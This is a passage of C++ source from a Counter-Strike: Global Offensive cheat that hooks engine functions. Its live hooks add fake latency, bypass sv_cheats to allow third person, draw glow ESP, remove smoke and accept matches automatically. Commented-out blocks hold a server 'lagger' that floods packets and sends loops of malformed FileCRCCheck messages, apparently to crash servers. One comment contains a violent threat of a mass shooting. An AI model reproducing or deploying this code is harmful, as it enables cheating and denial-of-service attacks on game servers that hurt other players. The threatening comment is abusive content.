        static bool toggle = false;
        static bool lastHeld = false;

        bool down = GetAsyncKeyState(VK_INSERT) & 0x8000;
        if (down && !lastHeld) {
            toggle = !toggle;
            if (toggle)
                I::Engine->ClientCmdUnrestricted("echo \"> lagger ON\"");
            else
                I::Engine->ClientCmdUnrestricted("echo \"> lagger OFF\"");
        }

        if (toggle) {
            for (int i = 0; i < 15; i++)
                SendOurMessage(I::Engine->GetNetworkChannel(), buffStat.GetData(), buffStat.GetNumBytesWritten(), false, true, true, false);


        }
        lastHeld = down;
        Sleep(1);

    }
}*/
//g_pFileSystem->MarkAllCRCsUnverified();
/*
int cTotal = 0;
int cTotalMatch = 0;
int count = 0;
do
{
    CUnverifiedFileHash rgUnverifiedFiles[1];
    static void* g_pFileSystem = I::find(ENGINE_DLL, XorStr("VFileSystem017"));
    typedef void((__thiscall* markAllFilesUnverified)(void*));
    reinterpret_cast<markAllFilesUnverified>(g_pFileSystem + 392)()();
    typedef int((__thiscall* getUnverifiedFileHashes)(CUnverifiedFileHash*, int));
    count = ((getUnverifiedFileHashes)g_pFileSystem + 404)(g_pFileSystem, rgUnverifiedFiles, 1);

    //count = (*(int(__thiscall**)(int, CUnverifiedFileHash*, int))(&g_pFileSystem + 404))(g_pFileSystem, rgUnverifiedFiles, 1);
    count = (*(int(__thiscall**)(void*, CUnverifiedFileHash*, int))(&g_pFileSystem + 404))(g_pFileSystem, rgUnverifiedFiles, 1);
    if (((std::string)rgUnverifiedFiles[0].m_Filename).ends_with("de_mocha.bsp"))
    {
        std::cout << "CRC: " << CRC32_ConvertToUnsignedLong(&rgUnverifiedFiles[0].m_FileHash.m_crcIOSequence);
        cTotalMatch++;
    }
    if (count)
        cTotal++;
} while (count);

//auto sex = CalculateCRCForFile("C:\\Program Files (x86)\\steam\\steamapps\\common\\Counter-Strike Global Offensive\\csgo\\maps\\de_mocha.bsp");
// std::cout << "CRC: " << std::to_string(sex) <<
// I AM GOING TO FUCKING COMMIT A MASS SHOOTING IN BELLEING KMLB<V FUCK VALVE
}
}
}
*/
bool __fastcall H::hkTimingOut(void* ecx, void* edx)
{
    return false;
}
float __fastcall  H::hkLastPacket(void* ecx, void* edx)
{
    return 0.0;
}

int FASTCALL H::hkSendDatagram(INetChannel* thisptr, int edx, bf_write* pDatagram)
{
    g_OurNetChann = thisptr;
    static auto oSendDatagram = DTR::SendDatagram.GetOriginal<decltype(&hkSendDatagram)>();
    NetworkingMutex.lock();

    INetChannelInfo* pNetChannelInfo = I::Engine->GetNetChannelInfo();
    static CConVar* sv_maxunlag = I::ConVar->FindVar(XorStr("sv_maxunlag"));

    if (!I::Engine->IsInGame() || pDatagram != nullptr || pNetChannelInfo == nullptr || sv_maxunlag == nullptr) {
        NetworkingMutex.unlock();
        return oSendDatagram(thisptr, edx, pDatagram);

    }

    const int iOldInReliableState = thisptr->iInReliableState;
    const int iOldInSequenceNr = thisptr->iInSequenceNr;


    // calculate max available fake latency with our real ping to keep it w/o real lags or delays
    const float flMaxLatency = std::max(0.f, std::clamp(C::Get<float>(Vars.flMiscLatencyFactor), 0.f, sv_maxunlag->GetFloat()) - pNetChannelInfo->GetLatency(FLOW_OUTGOING));
    CLagCompensation::Get().AddLatencyToNetChannel(thisptr, flMaxLatency);

    thisptr->iInReliableState = iOldInReliableState;
    thisptr->iInSequenceNr = iOldInSequenceNr;
    const int iReturn = oSendDatagram(thisptr, edx, pDatagram);
    /*if ((GetAsyncKeyState(VK_INSERT) & 0x8000) && save_edx != 1337) {
        for (int i = 0; i <= 10000; i++) {
            const int pBufferSize = 523956 - (50 * 1260);
            char pSignOnBuffer[pBufferSize];
            bf_write pMsg(pSignOnBuffer, pBufferSize);
            srand((unsigned)time(NULL) * thisptr->iInSequenceNr);

            /*for (int k = 1; k <= pBufferSize - 1; k++)
                pMsg.WriteByte(rand());
            for (int k = 0; k < 2; k++) {
                CCLCMsg_FileCRCCheck pure;
                //CCLCMsg_FileCRCCheck_t::SetPath(pure, "GAME");
                pure.set_path("GAME");
                pure.set_pack_file_id(0);
                //pure.set_code_filename(-1);
                pure.set_crc(0);
                pure.set_file_hash_type(1);
                pure.set_code_path(-1);
                pure.set_code_filename(-1);
                //pure.set_file_fraction(0);
                pure.set_filename(gen_random(63).c_str());



                /*pure.set_code_filename(-1);
                pure.set_code_path(-1);
                pure.set_path("GAME");
                pure.set_filename(("bin\\pak01.vpk" + gen_random(63, thisptr->iInSequenceNr)).c_str());
                pure.set_crc(0);*/
                /*pure.set_file_fraction(0);
                pure.set_md5("d41d8cd98f00b204e9800998ecf8427e");
                pure.set_file_hash_type(0);
                pure.set_file_len(0);
                pure.set_pack_file_number(0);
                pure.set_pack_file_id(0);*/
                //pMsg.m_bOverflow = false;
                /*CCLCMsg_BaselineAck sex;
                sex.set_baseline_nr(-1);
                sex.set_baseline_tick(-1);
                //sex.set_allocated_convars(&sex2);
                //g_ProtoWriter.WriteCRCChecksum(&pure, &pMsg); // CNetMessageBinder<>
                WriteProtobufToBuffer(&pure, &pMsg, clc_FileCRCCheck);
            }
            pMsg.m_bOverflow = false;

            /*for (int k = -65536; k <= 65536; k++) {
                CNETMsg_SplitScreenUser sex;
                sex.set_slot(k);
                g_ProtoWriter.WriteSplitScreenUser(&sex, &pMsg);
            }
            DTR::SendDatagram.GetOriginal<decltype(&hkSendDatagram)>()(thisptr, edx, &pMsg);
            //pNetChannel->Transmit();
            //free(pSignOnBuffer);

            //free(pMsg);

        }
    }*/
    NetworkingMutex.unlock();
    return iReturn;
}

void H::hkClMove(void* ecx, float accumulated_extra_samples, bool bFinalTick) {
    static auto oClMove = DTR::ClMove.GetOriginal<decltype(&hkClMove)>();

    if (lagtoggle && !isCallingClMove)
        return;
    else
        return oClMove(ecx, accumulated_extra_samples, bFinalTick);
}

void FASTCALL H::hkOverrideView(IClientModeShared* thisptr, int edx, CViewSetup* pSetup)
{
    static auto oOverrideView = DTR::OverrideView.GetOriginal<decltype(&hkOverrideView)>();

    if (!I::Engine->IsInGame() || I::Engine->IsTakingScreenshot())
        return oOverrideView(thisptr, edx, pSetup);

    // get camera origin
    G::vecCamera = pSetup->vecOrigin;

    if (G::pLocal == nullptr || !G::pLocal->IsAlive())
        return oOverrideView(thisptr, edx, pSetup);

    CBaseCombatWeapon* pWeapon = G::pLocal->GetWeapon();

    if (pWeapon == nullptr)
        return oOverrideView(thisptr, edx, pSetup);

    if (CCSWeaponData* pWeaponData = I::WeaponSystem->GetWeaponData(pWeapon->GetItemDefinitionIndex());
        pWeaponData != nullptr && C::Get<bool>(Vars.bScreen) && std::fpclassify(C::Get<float>(Vars.flScreenCameraFOV)) != FP_ZERO &&
        // check is we not scoped
        (pWeaponData->nWeaponType == WEAPONTYPE_SNIPER ? !G::pLocal->IsScoped() : true))
        // set camera fov
        pSetup->flFOV += C::Get<float>(Vars.flScreenCameraFOV);

    oOverrideView(thisptr, edx, pSetup);
}

void FASTCALL H::hkOverrideMouseInput(IClientModeShared* thisptr, int edx, float* x, float* y)
{
    static auto oOverrideMouseInput = DTR::OverrideMouseInput.GetOriginal<decltype(&hkOverrideMouseInput)>();

    if (!I::Engine->IsInGame())
        return oOverrideMouseInput(thisptr, edx, x, y);

    oOverrideMouseInput(thisptr, edx, x, y);
}

float FASTCALL H::hkGetViewModelFOV(IClientModeShared* thisptr, int edx)
{
    static auto oGetViewModelFOV = DTR::GetViewModelFOV.GetOriginal<decltype(&hkGetViewModelFOV)>();

    if (!I::Engine->IsInGame() || I::Engine->IsTakingScreenshot())
        return oGetViewModelFOV(thisptr, edx);

    if (G::pLocal != nullptr && G::pLocal->IsAlive() && C::Get<bool>(Vars.bScreen) && std::fpclassify(C::Get<float>(Vars.flScreenViewModelFOV)) != FP_ZERO)
        return oGetViewModelFOV(thisptr, edx) + C::Get<float>(Vars.flScreenViewModelFOV);

    return oGetViewModelFOV(thisptr, edx);
}

int FASTCALL H::hkDoPostScreenEffects(IClientModeShared* thisptr, int edx, CViewSetup* pSetup)
{
    static auto oDoPostScreenEffects = DTR::DoPostScreenEffects.GetOriginal<decltype(&hkDoPostScreenEffects)>();

    if (!I::Engine->IsInGame() || I::Engine->IsTakingScreenshot())
        return oDoPostScreenEffects(thisptr, edx, pSetup);

    if (G::pLocal != nullptr && C::Get<bool>(Vars.bEsp) && C::Get<bool>(Vars.bEspGlow))
        CVisuals::Get().Glow(G::pLocal);

    return oDoPostScreenEffects(thisptr, edx, pSetup);
}

void FASTCALL H::hkRunCommand(IPrediction* thisptr, int edx, CBaseEntity* pEntity, CUserCmd* pCmd, IMoveHelper* pMoveHelper)
{
    static auto oRunCommand = DTR::RunCommand.GetOriginal<decltype(&hkRunCommand)>();

    /* there is tickbase corrections / velocity modifier fix */

    oRunCommand(thisptr, edx, pEntity, pCmd, pMoveHelper);

    // get movehelper interface pointer
    I::MoveHelper = pMoveHelper;
}

int FASTCALL H::hkSendMessage(ISteamGameCoordinator* thisptr, int edx, std::uint32_t uMsgType, const void* pData, std::uint32_t uData)
{
    static auto oSendMessage = DTR::SendMessageGC.GetOriginal<decltype(&hkSendMessage)>();

    std::uint32_t uMessageType = uMsgType & 0x7FFFFFFF;
    void* pDataMutable = const_cast<void*>(pData);

    const int iStatus = oSendMessage(thisptr, edx, uMsgType, pDataMutable, uData);

    if (iStatus != EGCResultOK)
        return iStatus;

#ifdef DEBUG_CONSOLE
    L::PushConsoleColor(FOREGROUND_INTENSE_GREEN | FOREGROUND_RED);
    L::Print(fmt::format(XorStr("[<-] Message sent to GC {:d}!"), uMessageType));
    L::PopConsoleColor();
#endif

    return iStatus;
}

int FASTCALL H::hkRetrieveMessage(ISteamGameCoordinator* thisptr, int edx, std::uint32_t* puMsgType, void* pDest, std::uint32_t uDest, std::uint32_t* puMsgSize)
{
    static auto oRetrieveMessage = DTR::RetrieveMessage.GetOriginal<decltype(&hkRetrieveMessage)>();
    const int iStatus = oRetrieveMessage(thisptr, edx, puMsgType, pDest, uDest, puMsgSize);

    if (iStatus != EGCResultOK)
        return iStatus;

    std::uint32_t uMessageType = *puMsgType & 0x7FFFFFFF;

#ifdef DEBUG_CONSOLE
    L::PushConsoleColor(FOREGROUND_INTENSE_GREEN | FOREGROUND_RED);
    L::Print(fmt::format(XorStr("[->] Message received from GC {:d}!"), uMessageType));
    L::PopConsoleColor();
#endif

    // check for k_EMsgGCCStrike15_v2_GCToClientSteamdatagramTicket message when we can accept the game
    if (C::Get<bool>(Vars.bMiscAutoAccept) && uMessageType == 9177)
    {
        U::SetLocalPlayerReady();
        Beep(500, 800);
        U::FlashWindow(IPT::hWindow);
    }

    return iStatus;
}

bool FASTCALL H::hkSvCheatsGetBool(CConVar* thisptr, int edx)
{
    static auto oSvCheatsGetBool = DTR::SvCheatsGetBool.GetOriginal<decltype(&hkSvCheatsGetBool)>();
    static std::uintptr_t uCAM_ThinkReturn = (MEM::FindPattern(CLIENT_DLL, XorStr("85 C0 75 30 38 86"))); // @xref: "Pitch: %6.1f   Yaw: %6.1f   Dist: %6.1f %16s"

    if (reinterpret_cast<std::uintptr_t>(_ReturnAddress()) == uCAM_ThinkReturn && C::Get<bool>(Vars.bWorld) && C::Get<int>(Vars.iWorldThirdPersonKey) > 0)
        return true;

    return oSvCheatsGetBool(thisptr, edx);
}
int FASTCALL H::hkNetGraph(CConVar* thisptr, int edx)
{
    return 99999;
}

long CALLBACK H::hkWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    // process keys
    IPT::Process(uMsg, wParam, lParam);

    // switch window state on key click
    if (C::Get<int>(Vars.iMenuKey) > 0 && IPT::IsKeyReleased(C::Get<int>(Vars.iMenuKey)))
        W::bMainOpened = !W::bMainOpened;

    // disable game input when menu is opened
    I::InputSystem->EnableInput(!W::bMainOpened);

    /*
     * @note: we can use imgui input handler to our binds if remove menu state check
     * with ImGui::IsKeyDown, ImGui::IsKeyPressed, etc functions
     * but imgui api's keys down durations doesnt have forward compatibility
     * and i dont want spend a lot of time on recode it
     */
    if (D::bInitialized && W::bMainOpened && ImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam))
        return 1L;

    // return input controls to the game
    return CallWindowProcW(IPT::pOldWndProc, hWnd, uMsg, wParam, lParam);
}
#pragma endregion

#pragma region proxies_get
bool P::Setup()
{
    // @note: as example
#if 0
    RecvProp_t* pSmokeEffectTickBegin = CNetvarManager::Get().mapProps[FNV1A::HashConst("CSmokeGrenadeProjectile->m_nSmokeEffectTickBegin")].pRecvProp;
    if (pSmokeEffectTickBegin == nullptr)
        return false;

    RVP::SmokeEffectTickBegin = std::make_shared<CRecvPropHook>(pSmokeEffectTickBegin, P::SmokeEffectTickBegin);
#endif

    return true;
}

void P::Restore()
{
    // @note: as example
#if 0
// restore smoke effect
    RVP::SmokeEffectTickBegin->Restore();
#endif
}
#pragma endregion

#pragma region proxies_handlers
void P::SmokeEffectTickBegin(const CRecvProxyData* pData, void* pStruct, void* pOut)
{
    static auto oSmokeEffectTickBegin = RVP::SmokeEffectTickBegin->GetOriginal();

    if (C::Get<bool>(Vars.bWorld) && C::Get<std::vector<bool>>(Vars.vecWorldRemovals).at(REMOVAL_SMOKE))
    {
        if (auto pEntity = static_cast<CBaseEntity*>(pStruct); pEntity != nullptr)
            pEntity->GetOrigin() = Vector(MAX_COORD_FLOAT, MAX_COORD_FLOAT, MAX_COORD_FLOAT);
    }

    oSmokeEffectTickBegin(pData, pStruct, pOut);
}
#pragma endregion
